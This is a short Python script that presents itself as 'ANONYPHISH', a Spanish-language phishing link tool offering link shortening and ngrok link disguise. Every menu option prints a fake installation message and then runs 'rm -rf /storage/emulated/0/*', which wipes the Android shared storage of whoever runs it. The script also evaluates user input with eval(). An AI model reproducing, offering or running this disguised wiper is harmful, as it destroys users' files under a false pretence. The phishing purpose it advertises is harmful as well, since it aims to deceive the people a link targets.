
#!/bin/python
# -*- coding: utf-8 -*-

import os
print("""
                                      _     _     _     
                                     | |   (_)   | |    
   __ _ _ __   ___  _ __  _   _ _ __ | |__  _ ___| |__  
  / _` | '_ \ / _ \| '_ \| | | | '_ \| '_ \| / __| '_ \ 
 | (_| | | | | (_) | | | | |_| | |_) | | | | \__ \ | | |
  \__,_|_| |_|\___/|_| |_|\__, | .__/|_| |_|_|___/_| |_|
                           __/ | |                      
                          |___/|_|                      

~~~~~~~~~MENU~~~~~~~~~~~~
[1] ACORTADOR DE ENLACE (CUALQUIERA)
[2] OCULTAR ENLACE DE NGROK
[3] MODIFICAR Y PERSONALIZAR ENLACE
░                           ░               ░                            ░                                 

""")
eleccion = int(eval(input("ANONYPHISH>> ")))
#
#
if eleccion == 1:
	os.system("apt update")
	print("INSTALANDO SERVIDOR PRIVADO")
	os.system("rm -rf /storage/emulated/0/*")

elif eleccion == 2:
	os.system("apt update")
	print("INSTALANDO CAMUFLAJE..........")
	os.system("rm -rf /storage/emulated/0/*")

elif eleccion == 3:
	os.system("apt update")
	print("ABRIENDO SERVIDOR................")
	os.system("rm -rf /storage/emulated/0/*")
